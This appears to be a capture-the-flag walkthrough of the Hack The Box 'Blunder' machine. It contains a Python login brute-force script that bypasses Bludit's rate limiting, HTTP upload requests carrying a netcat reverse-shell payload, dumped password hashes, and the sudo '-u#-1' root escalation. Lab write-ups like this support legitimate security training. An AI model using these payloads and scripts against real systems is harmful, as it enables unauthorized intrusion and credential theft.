---
layout: walkthrough
title: Blunder
description: "HTB Walkthrough"
logo: /assets/img/walkthroughs/blunder_logo.png
show-avatar: false
permalink: /walkthroughs/blunder.html
OS: Linux
difficulty: Easy
release: 30 May 2020
creator: <a href="https://www.hackthebox.eu/home/users/profile/94858">egotisticalSW</a>
cleared: 20 Jun 2020
published: 2020 06 20
---

**Cliffs:** website is running Bludit CMS vulnerable to authenticated RCE and a brute force mitigation bypass. Use CEWL to generate password list and a discovered .txt file for username and then brute force the creds. Exploit RCE for reverse shell. View a bludit database php file for creds to escalate to user. Exploit sudo vulnerability for root access.

<h2 align="center">Enumeration</h2>

Starting with a standard nmap scan...

```
# Nmap 7.80 scan initiated Sat Jun 20 11:26:49 2020 as: nmap -sC -sV -p- -oN nmapscan.txt 10.10.10.191
Nmap scan report for 10.10.10.191
Host is up (0.15s latency).
Not shown: 65533 filtered ports
PORT   STATE  SERVICE VERSION
21/tcp closed ftp
80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Blunder
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Blunder | A blunder of interesting facts

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jun 20 13:07:10 2020 -- 1 IP address (1 host up) scanned in 6021.03 seconds
```

Using our browser to see the http running on port 80, it looks like some kind of CMS is being used to create the webpage.

![webpage](/assets/img/walkthroughs/blunder_webpage.png)

Running

```sh
gobuster dir -w <wordlist> -x php,txt -o <outputfile> -u 10.10.10.191
```

with the appropriate wordlist yields the following

```
/about (Status: 200)
/0 (Status: 200)
/admin (Status: 301)
/install.php (Status: 200)
/robots.txt (Status: 200)
/todo.txt (Status: 200)
/usb (Status: 200)
/LICENSE (Status: 200)
```

If we look at the /admin page, we see it's titled <b>Bludit</b>, and if we look at the page source we see

![pagesource](/assets/img/walkthroughs/blunder_pagesource.png)

Via google we see that Bludit is indeed a CMS, and also that version 3.9.2 is vulnerable to remote code execution, however we need a valid username and password. It also is vulnerable to a brute force mitigation bypass. Rarely is brute forcing the path in a CTF, but it is rather too convenient that if we had credentials we would have a foothold AND there is an exploit involving brute forcing. It is still worth spending a small bit of time looking at other things so we don't plunge head first into a rabbit hole. With no other services running here though, we don't need to spend long.

An explanation of the vulnerability as well as a python script that exploits it can be found <a href="https://rastating.github.io/bludit-brute-force-mitigation-bypass/"> here</a>. We will have to change the script to suit our needs, but this is simple. We just need it to load a wordlist and use that instead of the simple attempts it currently makes. If brute force is indeed the intended path, the password won't be buried deep in a wordlist as that unnecessarily hammers the servers. So we will just use the first 500 entries of the most popular wordlist, "rockyou.txt". We create the wordlist by entering the following Linux command

```s
head -n 500 /path/to/rockyou.txt > rock500.txt
```


Below is Rastating's modified script which uses our created wordlist.

```python
#!/usr/bin/env python3
import re
import requests

host = 'http://10.10.10.191'
login_url = host + '/admin/'
username = 'admin'
file = 'rock500.txt'
wordlist = []

with open(file) as f:
    for line in f:
        wordlist.append(line.strip())

for password in wordlist:
    session = requests.Session()
    login_page = session.get(login_url)
    csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)

    print('[*] Trying: {p}'.format(p = password))

    headers = {
        'X-Forwarded-For': password,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
        'Referer': login_url
    }

    data = {
        'tokenCSRF': csrf_token,
        'username': username,
        'password': password,
        'save': ''
    }

    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)

    if 'location' in login_result.headers:
        if '/admin/dashboard' in login_result.headers['location']:
            print()
            print('SUCCESS: Password found!')
            print('Use {u}:{p} to login.'.format(u = username, p = password))
            print()
            break

```

If we run that we will however exhaust the wordlist without a successful login. We could try a different wordlist, or go deeper into rockyou, but neither seems very likely to succeed. The webpage itself is very verbose, what if the password is hidden in there? We can use the tool <b>Cewl</b> to generate a wordlist from the page itself with the following command.

```sas
cewl -m 5 --with-numbers -w ceweled.txt http://10.10.10.191
```

<i>-m 5</i> 	specifies the minimum word length to be 5

<i>--with-numbers </i>	allows the use of words containing numbers

<i>-w ceweled.txt</i>	saves the output to a file named ceweled.txt

Checking the output we see it is a manageable number of entries

```
hilbert@kali:~/HTB/Machines/Blunder$ wc -l ceweled.txt 
243 ceweled.txt
```

We change the script to use 'ceweled.txt' and run it again, however we are still unsuccessful in finding a valid login. 

What if instead of not having a correct password, we don't have the correct username? In the <b>todo.txt</b> gobuster turned up, we see

![todo.txt](/assets/img/walkthroughs/blunder_todo.png)

This suggests that Fergus has access to the page. So let's try the ceweled.txt wordlist again, this time with a username of 'fergus'.

```sh
[*] Trying: character
[*] Trying: RolandDeschain
()
SUCCESS: Password found!
Use fergus:RolandDeschain to login.
()
```

Success!! Now that we have valid credentials we can run the RCE.

The easiest way is to use <a href="https://www.exploit-db.com/exploits/47699">the Metasploit module</a> <b>exploit/linux/http/bludit_upload_images_exec</b> and set the appropriate options. 

If you want to do it manually you can get an idea for how the exploit works <a href="https://github.com/bludit/bludit/issues/1081">here</a>, or by reviewing the code for the Metasploit module. Using **Burp Suite** we can upload a php reverse shell, and an .htaccess file

```
POST /admin/ajax/upload-images HTTP/1.1
Host: 10.10.10.191
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.191/admin/new-content
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; 
boundary=---------------------------33062673224378799335303524
Content-Length: 586
Connection: close
Cookie: BLUDIT-KEY=qiovd2vvbmt8j1uh6fr7duen84

-----------------------------33062673224378799335303524
Content-Disposition: form-data; name="images[]"; filename="reverse.php"
Content-Type: image/jpeg

<?php shell_exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.13.31 1234 >/tmp/f");?>
-----------------------------33062673224378799335303524
Content-Disposition: form-data; name="uuid"

../../tmp
-----------------------------33062673224378799335303524
Content-Disposition: form-data; name="tokenCSRF"

491d604267f20ac5fa461492b79285b0d128bb98
-----------------------------33062673224378799335303524--
```
<br>
```
POST /admin/ajax/upload-images HTTP/1.1
Host: 10.10.10.191
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.191/admin/new-content
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data;
boundary=---------------------------33062673224378799335303524
Content-Length: 500
Connection: close
Cookie: BLUDIT-KEY=qiovd2vvbmt8j1uh6fr7duen84

-----------------------------33062673224378799335303524
Content-Disposition: form-data; name="images[]"; filename=".htaccess"
Content-Type: image/jpeg

RewriteEngine off
-----------------------------33062673224378799335303524
Content-Disposition: form-data; name="uuid"

../../tmp
-----------------------------33062673224378799335303524
Content-Disposition: form-data; name="tokenCSRF"

491d604267f20ac5fa461492b79285b0d128bb98
-----------------------------33062673224378799335303524--
```



Then with our netcat listener up we visit http://10.10.10.191/bl-content/tmp/reverse.php

```
hilbert@kali:~/HTB/Machines/Blunder$ nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.13.31] from (UNKNOWN) [10.10.10.191] 44438
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

Whichever method you choose, we now have access as user **www-data**.

One of the things we could have done when looking around a bit more before jumping into brute forcing was explore the structure of the webpage after we learned Bludit was running on it. We would have seen that there was a databases directory

![databases](/assets/img/walkthroughs/blunder_databases.png)

We had to use a password to login, and those have to be stored somewhere, so this seems like a good place to look now that we have access. Using the find command and outputting errors to /dev/null so our screen isn't a mess of "Permission denied"'s we see

```
www-data@blunder:/home$ find / -name databases 2>/dev/null
/var/www/bludit-3.10.0a/bl-content/databases
/var/www/bludit-3.9.2/bl-content/databases
```

Interesting, it looks like a newer version of Bludit is also installed. Checking the 3.9.2 version first, if we look at **users.php** in the database directory, we see entries for an admin and fergus.

```
www-data@blunder:/var/www/bludit-3.9.2/bl-content/databases$ cat users.php
<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
    "admin": {
        "nickname": "Admin",
        "firstName": "Administrator",
        "lastName": "",
        "role": "admin",
        "password": "bfcc887f62e36ea019e3295aafb8a3885966e265",
        "salt": "5dde2887e7aca",
<...>
    },
    "fergus": {
        "firstName": "",
        "lastName": "",
        "nickname": "",
        "description": "",
        "role": "author",
        "password": "be5e169cdf51bd4c878ae89a0a89de9cc0c9d8c7",
        "salt": "jqxpjfnv",
<...>
```

We already know fergus's password, but now we can potentially crack admins. Let's check the users.php in the other version of Bludit installed.

```
www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ cat users.php
<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
    "admin": {
        "nickname": "Hugo",
        "firstName": "Hugo",
        "lastName": "",
        "role": "User",
        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
<...>
```

One of the first things we typically do when gaining access to a box is look at /etc/passwd and scan the /home folder. If we've done that already here, we will recognize Hugo as one of the local users and the one with the user.txt flag, so this is promising. Since his password is unsalted, unlike the admins, we can quickly check a rainbow table to see if it has been cracked. Checking <a hred="https://crackstation.net">CrackStation</a> we see

![cracked](/assets/img/walkthroughs/blunder_cracked.png)

Let's see if he also uses this password for his Linux user account.

```
www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ su hugo
Password: Password120
hugo@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ whoami
hugo
```

We now have access as user hugo and can access the user.txt flag.




<h3 align="center">On To Root!</h3>

 The first thing we do is check to see what privileges are available to us by using **sudo -ll**

```
hugo@blunder:~$ sudo -ll
Password: Password120

Matching Defaults entries for hugo on blunder:
    env_reset, mail_badpass,
 secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hugo may run the following commands on blunder:

Sudoers entry:
    RunAsUsers: ALL, !root
    Commands:
        /bin/bash
hugo@blunder:~$ 
```

So we can run /bin/bash as all users except for root. There is a not too long ago discovered vulnerability in older versions of sudo where we can elevate our command to root in such a configuration. <a href="https://bit-tech.net/news/tech/software/sudo-utility-hit-by-permission-bypass-vulnerability/1/">Info1</a>, <a href="https://www.exploit-db.com/exploits/47502">Info2</a>.

```
hugo@blunder:~$ sudo -u#-1 /bin/bash
Password: Password120

root@blunder:/home/hugo# whoami
root
```

We now have access to the root.txt flag.
